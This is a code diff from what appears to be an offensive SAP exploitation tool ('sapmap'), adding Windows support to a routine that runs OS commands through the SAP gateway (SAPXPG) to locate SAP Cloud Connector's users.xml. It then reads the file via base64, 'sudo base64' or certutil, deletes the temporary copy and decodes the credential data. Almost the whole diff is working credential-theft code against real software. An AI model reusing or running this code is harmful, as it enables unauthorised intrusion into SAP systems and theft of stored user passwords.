@@ -1885,62 +1885,98 @@ def create_app(api: SAPMAPApi) -> Bottle:
                 # concatenates PARAMS+LONG_PARAMS, turning "cat /path" into
                 # "cat /path /path" and returning the file content twice.
                 from sapmap_exploit import execute_gw_command
+                is_win = "windows" in (n.os_type or "").lower() or \
+                         "nt" in (n.os_type or "").lower()
                 def _gw(prog, arg):
                     r = execute_gw_command(n, prog, arg, long_params="")
                     return "\n".join(r.get("output") or []).strip(), r.get("success", False)
 
-                scc_roots = [
-                    "/opt/sap/scc",
-                    "/usr/local/scc",
-                    "/opt/sapscc",
-                    "/opt/cloud-connector",
-                    "/opt/SAP/cloud-connector",
-                ]
-                fpath = None
-                for root in scc_roots:
-                    candidate = f"{root}/config/users.xml"
-                    ls_out, _ = _gw("ls", candidate)
-                    ls_ok = ls_out.startswith(candidate) and \
-                            "Permission denied" not in ls_out and \
-                            "No such file" not in ls_out
-                    print(f"[*] SCC {host}: ls {candidate} → "
-                          f"ok={ls_ok} out={ls_out[:60]!r}")
-                    if ls_ok or "Permission denied" in ls_out:
-                        fpath = candidate
-                        if "Permission denied" in ls_out:
-                            print(f"[*] SCC {host}: ls permission denied — "
-                                  f"will try cat anyway")
-                        break
-                if not fpath:
-                    print(f"[-] SCC {host}: users.xml not found via "
-                          f"{n.sid} (checked {len(scc_roots)} paths)")
-                    continue
+                # Linux paths use ls + base64; Windows uses dir + certutil
+                if is_win:
+                    win_roots = [
+                        r"C:\Program Files\SAP\Cloud Connector",
+                        r"C:\Program Files\SAP\SAP Cloud Connector",
+                        r"C:\sap\scc",
+                    ]
+                    fpath = None
+                    for root in win_roots:
+                        candidate = rf"{root}\config\users.xml"
+                        dir_out, _ = _gw("cmd.exe",
+                                         f"/c if exist \"{candidate}\" echo FOUND")
+                        if "FOUND" in dir_out:
+                            fpath = candidate
+                            print(f"[*] SCC {host}: found {candidate} on Windows")
+                            break
+                    if not fpath:
+                        print(f"[-] SCC {host}: users.xml not found via "
+                              f"{n.sid} on Windows (checked {len(win_roots)} paths)")
+                        continue
+                    # certutil -encode reads file and base64-encodes it
+                    tmp = r"C:\Windows\Temp\.scc_users.b64"
+                    certutil_out, _ = _gw(
+                        "cmd.exe",
+                        f"/c certutil -encode \"{fpath}\" \"{tmp}\" && type \"{tmp}\"")
+                    import base64 as _b64e, re as _re2
+                    # certutil wraps in -----BEGIN----- / -----END-----
+                    b64 = "".join(_re2.findall(
+                        r'[A-Za-z0-9+/=]+', certutil_out))
+                    _gw("cmd.exe", f"/c del /q \"{tmp}\" 2>nul")
+                    raw = None
+                    if b64:
+                        try:
+                            raw = _b64e.b64decode(b64)
+                        except Exception as e:
+                            print(f"[-] SCC {host}: certutil decode error: {e}")
+                else:
+                    linux_roots = [
+                        "/opt/sap/scc",
+                        "/usr/local/scc",
+                        "/opt/sapscc",
+                        "/opt/cloud-connector",
+                        "/opt/SAP/cloud-connector",
+                    ]
+                    fpath = None
+                    for root in linux_roots:
+                        candidate = f"{root}/config/users.xml"
+                        ls_out, _ = _gw("ls", candidate)
+                        ls_ok = ls_out.startswith(candidate) and \
+                                "Permission denied" not in ls_out and \
+                                "No such file" not in ls_out
+                        print(f"[*] SCC {host}: ls {candidate} → "
+                              f"ok={ls_ok} out={ls_out[:60]!r}")
+                        if ls_ok or "Permission denied" in ls_out:
+                            fpath = candidate
+                            if "Permission denied" in ls_out:
+                                print(f"[*] SCC {host}: ls permission denied — "
+                                      f"will try base64 anyway")
+                            break
+                    if not fpath:
+                        print(f"[-] SCC {host}: users.xml not found via "
+                              f"{n.sid} (checked {len(linux_roots)} paths)")
+                        continue
 
-                # SAPXPG truncates output lines at ~128 bytes. The <user>
-                # element with its long password attribute exceeds that,
-                # producing incomplete XML. Read via base64 instead — it
-                # outputs 76-char lines regardless of input line length,
-                # then we decode back to XML on our side.
-                def _read_via_base64(prog, arg):
-                    out, ok = _gw(prog, arg)
-                    if not ok or "Permission denied" in out:
-                        return None, out
+                    # Read via base64 to avoid SAPXPG 128-byte line limit
                     import base64 as _b64e
-                    b64 = out.replace("\n", "").replace("\r", "").strip()
-                    try:
-                        return _b64e.b64decode(b64), ""
-                    except Exception as e:
-                        return None, f"base64 decode error: {e}"
+                    def _read_via_base64(prog, arg):
+                        out, ok = _gw(prog, arg)
+                        if not ok or "Permission denied" in out:
+                            return None, out
+                        b64 = out.replace("\n", "").replace("\r", "").strip()
+                        try:
+                            return _b64e.b64decode(b64), ""
+                        except Exception as e:
+                            return None, f"base64 decode error: {e}"
 
-                raw, err = _read_via_base64("base64", fpath)
-                print(f"[*] SCC {host}: base64 read → "
-                      f"{len(raw) if raw else 0}B err={err[:60]!r}")
-                if raw is None and "Permission denied" in err:
-                    print(f"[*] SCC {host}: permission denied — "
-                          f"trying sudo base64")
-                    raw, err = _read_via_base64("sudo", f"base64 {fpath}")
-                    print(f"[*] SCC {host}: sudo base64 → "
+                    raw, err = _read_via_base64("base64", fpath)
+                    print(f"[*] SCC {host}: base64 read → "
                           f"{len(raw) if raw else 0}B err={err[:60]!r}")
+                    if raw is None and "Permission denied" in err:
+                        print(f"[*] SCC {host}: permission denied — "
+                              f"trying sudo base64")
+                        raw, err = _read_via_base64("sudo", f"base64 {fpath}")
+                        print(f"[*] SCC {host}: sudo base64 → "
+                              f"{len(raw) if raw else 0}B err={err[:60]!r}")
+
                 if raw and raw.strip().startswith(b"<"):
                     xml_bytes = raw
                     xml_source = f"on-disk via {n.sid} OS-exec ({fpath})"
@@ -1948,8 +1984,8 @@ def create_app(api: SAPMAPApi) -> Bottle:
                           f"({len(xml_bytes)} bytes)")
                     break
                 else:
-                    print(f"[-] SCC {host}: could not read {fpath} via "
-                          f"base64 — err={err!r}")
+                    print(f"[-] SCC {host}: could not read {fpath} — "
+                          f"raw={raw[:20] if raw else None!r}")
             except Exception as e:
                 print(f"[-] SCC {host}: OS-exec Path 1 error: {e}")
 
